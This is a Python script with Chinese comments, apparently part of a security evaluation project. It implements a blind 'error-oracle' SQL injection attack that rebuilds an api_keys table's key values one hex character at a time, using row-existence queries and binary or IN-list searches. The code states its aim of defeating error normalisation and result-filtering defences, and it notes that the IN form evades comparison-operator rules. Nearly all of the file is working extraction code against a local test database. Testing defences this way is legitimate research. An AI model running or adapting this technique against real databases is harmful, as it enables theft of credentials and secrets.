"""
Phase 8 (方向 4): 错误信息差异分析（Error-Oracle）— 突破错误屏蔽防御

核心创新：
  当防御层做"错误归一化"（D8：所有 SQL 错误统一返回"查询失败"）时，
  攻击者仍可从"查询是否成功"这一二元状态推断信息。

  Error-Oracle 三态反馈：
    1. 成功 + 有行     → 条件为真
    2. 成功 + 无行     → 条件为假
    3. 错误            → 探针无效（重试）

  关键技巧：用 SELECT 1 FROM ... WHERE <条件> LIMIT 1 的"行存在性"
  作为 1 比特信道，完全不依赖返回内容，也不依赖错误信息文本。

  本脚本实现 Error-Oracle 攻击，用存在性信道做二分搜索重建数据，
  并验证其在"返回内容被完全屏蔽"的极端假设下仍然有效。
"""
import sqlite3
import json
import time
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict

HEX_CHARSET = "0123456789ABCDEF"

@dataclass
class ExistenceProbe:
    position: int
    threshold: str
    query: str
    has_row: Optional[bool]
    bit: int

class ErrorOracleAttack:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.probes: List[ExistenceProbe] = []
        self.probe_count = 0

    def existence_probe(self, query: str) -> Optional[bool]:
        """
        存在性探针：返回是否有行。
        不读取返回内容，仅用 cursor.fetchone() 是否为 None 判别。
        模拟 D4(结果过滤) + D8(错误归一化) 同时开启的场景。
        """
        self.probe_count += 1
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute(query)
            row = cursor.fetchone()
            conn.close()
            return row is not None
        except Exception:
            # D8 归一化后错误与"无行"不可区分 → 视为 False
            return None

    def make_existence_query(self, table: str, column: str,
                             position: int, threshold: str) -> str:
        """
        构造存在性判别查询：
          条件为真 → 返回 1 行；条件为假 → 返回 0 行
        """
        return (
            f"SELECT 1 FROM {table} "
            f"WHERE substr(hex({column}), {position}, 1) > '{threshold}' "
            f"LIMIT 1"
        )

    def make_membership_query(self, table: str, column: str,
                              position: int, candidates: str) -> str:
        """
        成员查询（IN 形式）：一次探针测试多个候选字符
        """
        in_list = ",".join(f"'{c}'" for c in candidates)
        return (
            f"SELECT 1 FROM {table} "
            f"WHERE substr(hex({column}), {position}, 1) IN ({in_list}) "
            f"LIMIT 1"
        )

    def reconstruct_position_binary(self, table: str, column: str,
                                    position: int) -> Optional[str]:
        """二分搜索：用存在性信道确定单个 hex 字符"""
        candidates = list(HEX_CHARSET)
        while len(candidates) > 1:
            mid = len(candidates) // 2
            threshold = candidates[mid - 1]
            query = self.make_existence_query(table, column, position, threshold)
            has_row = self.existence_probe(query)

            if has_row is None:
                return None

            bit = 1 if has_row else 0
            self.probes.append(ExistenceProbe(
                position=position, threshold=threshold, query=query,
                has_row=has_row, bit=bit
            ))
            if bit == 1:
                candidates = candidates[mid:]
            else:
                candidates = candidates[:mid]
        return candidates[0] if candidates else None

    def reconstruct_position_membership(self, table: str, column: str,
                                        position: int) -> Optional[str]:
        """
        成员搜索：把 16 字符集分成 2 组，用 IN 一次探针判别
        相比二分搜索，IN 形式更难被"比较运算"规则拦截
        """
        candidates = list(HEX_CHARSET)
        while len(candidates) > 1:
            mid = len(candidates) // 2
            group = candidates[:mid]
            query = self.make_membership_query(table, column, position, "".join(group))
            has_row = self.existence_probe(query)
            if has_row is None:
                return None
            bit = 1 if has_row else 0
            self.probes.append(ExistenceProbe(
                position=position, threshold="IN:" + "".join(group), query=query,
                has_row=has_row, bit=bit
            ))
            if bit == 1:
                candidates = group
            else:
                candidates = candidates[mid:]
        return candidates[0] if candidates else None

    def run(self, table: str = "api_keys", column: str = "key_value",
            max_positions: int = 16) -> Dict:
        print("=" * 70)
        print("Phase 8 (方向 4): Error-Oracle 存在性盲注")
        print("=" * 70)

        # 获取 hex 长度（用存在性信道，避免读取内容）
        # 二分搜索长度：SELECT 1 FROM api_keys WHERE length(hex(key_value)) > K
        length = self._binary_length(table, column)
        print(f"\n[长度推断] hex 长度 = {length}（存在性信道，未读取任何返回内容）")

        test_len = min(max_positions, length)

        # 策略 1：二分搜索（> 比较）
        print(f"\n[策略 1: 二分搜索] 重建前 {test_len} 位")
        self.probes.clear()
        self.probe_count = 0
        start = time.time()
        binary_result = []
        for pos in range(1, test_len + 1):
            ch = self.reconstruct_position_binary(table, column, pos)
            if ch is None:
                break
            binary_result.append(ch)
        binary_hex = "".join(binary_result)
        binary_probes = self.probe_count
        binary_elapsed = time.time() - start
        print(f"  结果: {binary_hex}（{binary_probes} 次探针）")

        # 策略 2：成员搜索（IN 形式）
        print(f"\n[策略 2: 成员搜索 IN] 重建前 {test_len} 位")
        self.probes.clear()
        self.probe_count = 0
        start = time.time()
        member_result = []
        for pos in range(1, test_len + 1):
            ch = self.reconstruct_position_membership(table, column, pos)
            if ch is None:
                break
            member_result.append(ch)
        member_hex = "".join(member_result)
        member_probes = self.probe_count
        member_elapsed = time.time() - start
        print(f"  结果: {member_hex}（{member_probes} 次探针）")

        # 真值校验
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(f"SELECT hex({column}) FROM {table} LIMIT 1")
        ground_truth = cursor.fetchone()[0]
        conn.close()
        truth_prefix = ground_truth[:test_len]

        binary_acc = round(sum(1 for a, b in zip(binary_hex, truth_prefix)
                               if a == b) / max(len(binary_hex), 1) * 100, 1)
        member_acc = round(sum(1 for a, b in zip(member_hex, truth_prefix)
                               if a == b) / max(len(member_hex), 1) * 100, 1)

        result = {
            "length_inferred": length,
            "ground_truth_length": len(ground_truth),
            "positions_tested": test_len,
            "strategy_binary": {
                "hex": binary_hex,
                "probes": binary_probes,
                "accuracy": binary_acc,
                "elapsed_s": round(binary_elapsed, 3)
            },
            "strategy_membership": {
                "hex": member_hex,
                "probes": member_probes,
                "accuracy": member_acc,
                "elapsed_s": round(member_elapsed, 3)
            },
            "ground_truth_prefix": truth_prefix,
            "total_probes": binary_probes + member_probes,
            "defense_assumption": "D4 结果过滤 + D8 错误归一化 同时开启，返回内容不可读",
            "conclusion": (
                f"在返回内容完全屏蔽的假设下，存在性信道仍可重建数据："
                f"二分搜索 {binary_acc}% 准确（{binary_probes} 探针），"
                f"成员搜索 {member_acc}% 准确（{member_probes} 探针）。"
            )
        }
        return result

    def _binary_length(self, table: str, column: str) -> int:
        """用存在性信道二分搜索 hex 长度"""
        lo, hi = 1, 256
        # 先快速上界
        while True:
            q = f"SELECT 1 FROM {table} WHERE length(hex({column})) > {hi} LIMIT 1"
            if self.existence_probe(q):
                lo = hi
                hi *= 2
            else:
                break
        while lo < hi:
            mid = (lo + hi) // 2
            q = f"SELECT 1 FROM {table} WHERE length(hex({column})) > {mid} LIMIT 1"
            if self.existence_probe(q):
                lo = mid + 1
            else:
                hi = mid
        return lo

def main():
    db_path = "C:\\Users\\Yi\\WorkBuddy\\2026-10-10-18-49-43\\llm-attack-eval\\results\\enhanced_crm.db"
    attack = ErrorOracleAttack(db_path)
    result = attack.run(max_positions=16)

    output_path = "results/phase8_error_oracle.json"
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print(f"\n结果已保存到: {output_path}")
    print(f"结论: {result['conclusion']}")
    return result

if __name__ == "__main__":
    main()
